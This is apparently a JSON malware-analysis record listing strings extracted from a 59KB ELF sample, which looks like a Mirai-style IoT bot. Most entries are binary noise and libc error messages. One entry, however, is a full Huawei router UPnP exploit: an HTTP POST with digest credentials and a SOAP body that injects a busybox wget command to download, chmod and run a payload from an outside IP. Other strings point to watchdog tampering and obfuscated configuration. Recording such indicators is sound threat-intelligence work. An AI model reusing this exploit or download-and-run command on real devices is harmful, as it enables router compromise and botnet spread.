{
    "malware_data": [
        {
            "filename": "99804ad418ef95e82d94a81fb390ff0f37378b9af1a6d9d91da857ee1c00394b.elf",
            "filetype": "7F454C46",
            "filesize": "59KB",
            "hash_sha256": "99804ad418ef95e82d94a81fb390ff0f37378b9af1a6d9d91da857ee1c00394b",
            "strings": [
                "8cY4H",
                "ui8`",
                ":})P.",
                "}=HP`",
                " }$KxB",
                "3x8!",
                "Y.8`",
                "9)<p",
                "9)'p",
                "9)6P",
                "_18~",
                "_!8~",
                "J}||",
                ":}VI.}6J",
                "U) 6|",
                "xU) 6",
                "ye|y",
                "HA~$",
                "gM|y",
                "ey|}",
                "&9Tx",
                "dy|{",
                "#ETv",
                "a1|x",
                "]M|t",
                ">|cJ",
                ">}(J",
                "}#Kx9)",
                "}ZSx",
                "@.})",
                "E98`",
                " ]8`+fH",
                "'u<`",
                "#a<`",
                "P0})",
                "\\09`",
                "UIX(}JJx",
                "}JJx|",
                "@?`>",
                "U`X(",
                "}kJx}JZx",
                "!} HP",
                "UjX(}kRx",
                "P|cB",
                "UiX(",
                "}kJxUj",
                "|cH.N",
                "a\"L;a",
                "\"T|}",
                "!\"D;!",
                "}KSx",
                "}KSx}>",
                "}c[xA",
                "[x9)",
                "\"\\8!\"`N",
                "$}+Kx9k",
                "}#KxN",
                ",Q= ",
                ";x9@",
                ">}(Kx/",
                "W}@@P",
                "+x8!",
                "+x9J",
                " }!R",
                "+x9@",
                "}#Kx}e[x8",
                "+x}%KxD",
                "#x||",
                "4}#Kx",
                "Tc@.",
                "+x|}",
                "}#Kx",
                "8} J",
                "8})B",
                "D})XP=`",
                "\\|kH",
                ":}'R",
                "}^Sx/",
                "}^SxH",
                "}KSx;@",
                "})XP/",
                "$}#Kx",
                "\\})@P/",
                "}eXP= ",
                "$}+J",
                "}z[x9!",
                "}`(P",
                "#x9c",
                "QJD.QJ",
                "} @9A",
                "}ISxH",
                "}#Kx|j",
                "}+Kx`",
                "} 899+",
                "} HP;",
                "@,|}",
                "}#Kx8!",
                ":} B",
                "H81 ",
                " 0})",
                " >})",
                "}*HP",
                "}#XP9)",
                "}CSx",
                " }CSx}e[x",
                "}CSx}e[x",
                "}e[x}CSx",
                "x}$Kx",
                "}`XP+",
                ":}iS",
                "}+HPU)",
                ":}#J",
                "akNm",
                "9)09U)",
                "}FSx}i",
                "|`HQ@",
                ":} :",
                "}iXP",
                "#x|y",
                "}iXP= ",
                "}iXP;",
                "+x|v",
                "}}[x",
                "}a[xN",
                "}DSx",
                "P} HP",
                "@}l;",
                "`P}l[x}",
                "})0P})Z",
                "<`C0",
                "}h0P",
                "})PP|",
                "(}^\"",
                "@}fHP",
                "}jXP",
                "0}*XP",
                "})XP|",
                "Jx=i~",
                "})Zx|",
                "Hy9#",
                "}CSxN",
                "}c[xN",
                "Jx9C",
                "})Zx9c",
                "<}@Z",
                "}$Kx",
                ":})B",
                "#x9@",
                "})PP9I",
                "}@PPq`",
                "p}J(",
                " <?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "Content-Length: ",
                "/proc/%d",
                "/proc/self",
                "abcdefghijklmnopqrstuvwxyz",
                "/proc/%d/exe",
                "/tmp/%s",
                "%s%c",
                "/proc/self/cmdline",
                "/dev/watchdog",
                "/dev/misc/watchdog",
                "/sbin/watchdog",
                "/dev/FTWDT101_watchdog",
                "/dev/FTWDT101/watchdog",
                "/dev/watchdog0",
                "/etc/default/watchdog",
                "/etc/watchdog",
                "kuru is just better",
                "abcdefghijklmnopqrstuvw012345678",
                "ACVCKPNKLGQ",
                "LGV\"",
                "vqMWPAG",
                "gLEKLG",
                "sWGP[\"",
                "QJGNN\"",
                "GLC@NG\"",
                "Q[QVGO\"",
                "@WQ[@MZ",
                "okpck\"",
                "okpck",
                "CRRNGV",
                "DMWLF\"",
                "LAMPPGAV\"",
                "/proc/net/tcp",
                "(nil)",
                "(null)",
                "hlLjztqZ",
                "npxXoudifFeEgGaACScs",
                " +0-#'I",
                "Unknown error ",
                "Success",
                "Operation not permitted",
                "No such file or directory",
                "No such process",
                "Interrupted system call",
                "Input/output error",
                "No such device or address",
                "Argument list too long",
                "Exec format error",
                "Bad file descriptor",
                "No child processes",
                "Resource temporarily unavailable",
                "Cannot allocate memory",
                "Permission denied",
                "Bad address",
                "Block device required",
                "Device or resource busy",
                "File exists",
                "Invalid cross-device link",
                "No such device",
                "Not a directory",
                "Is a directory",
                "Invalid argument",
                "Too many open files in system",
                "Too many open files",
                "Inappropriate ioctl for device",
                "Text file busy",
                "File too large",
                "No space left on device",
                "Illegal seek",
                "Read-only file system",
                "Too many links",
                "Broken pipe",
                "Numerical argument out of domain",
                "Numerical result out of range",
                "Resource deadlock avoided",
                "File name too long",
                "No locks available",
                "Function not implemented",
                "Directory not empty",
                "Too many levels of symbolic links",
                "No message of desired type",
                "Identifier removed",
                "Channel number out of range",
                "Level 2 not synchronized",
                "Level 3 halted",
                "Level 3 reset",
                "Link number out of range",
                "Protocol driver not attached",
                "No CSI structure available",
                "Level 2 halted",
                "Invalid exchange",
                "Invalid request descriptor",
                "Exchange full",
                "No anode",
                "Invalid request code",
                "Invalid slot",
                "Bad font file format",
                "Device not a stream",
                "No data available",
                "Timer expired",
                "Out of streams resources",
                "Machine is not on the network",
                "Package not installed",
                "Object is remote",
                "Link has been severed",
                "Advertise error",
                "Srmount error",
                "Communication error on send",
                "Protocol error",
                "Multihop attempted",
                "RFS specific error",
                "Bad message",
                "Value too large for defined data type",
                "Name not unique on network",
                "File descriptor in bad state",
                "Remote address changed",
                "Can not access a needed shared library",
                "Accessing a corrupted shared library",
                ".lib section in a.out corrupted",
                "Attempting to link in too many shared libraries",
                "Cannot exec a shared library directly",
                "Invalid or incomplete multibyte or wide character",
                "Interrupted system call should be restarted",
                "Streams pipe error",
                "Too many users",
                "Socket operation on non-socket",
                "Destination address required",
                "Message too long",
                "Protocol wrong type for socket",
                "Protocol not available",
                "Protocol not supported",
                "Socket type not supported",
                "Operation not supported",
                "Protocol family not supported",
                "Address family not supported by protocol",
                "Address already in use",
                "Cannot assign requested address",
                "Network is down",
                "Network is unreachable",
                "Network dropped connection on reset",
                "Software caused connection abort",
                "Connection reset by peer",
                "No buffer space available",
                "Transport endpoint is already connected",
                "Transport endpoint is not connected",
                "Cannot send after transport endpoint shutdown",
                "Too many references: cannot splice",
                "Connection timed out",
                "Connection refused",
                "Host is down",
                "No route to host",
                "Operation already in progress",
                "Operation now in progress",
                "Stale NFS file handle",
                "Structure needs cleaning",
                "Not a XENIX named type file",
                "No XENIX semaphores available",
                "Is a named type file",
                "Remote I/O error",
                "Disk quota exceeded",
                "No medium found",
                "Wrong medium type",
                "?/dev/null",
                " Nnk(A ",
                "S[kA",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data",
                ".sdata",
                ".sbss",
                ".bss"
            ]
        }
    ]
}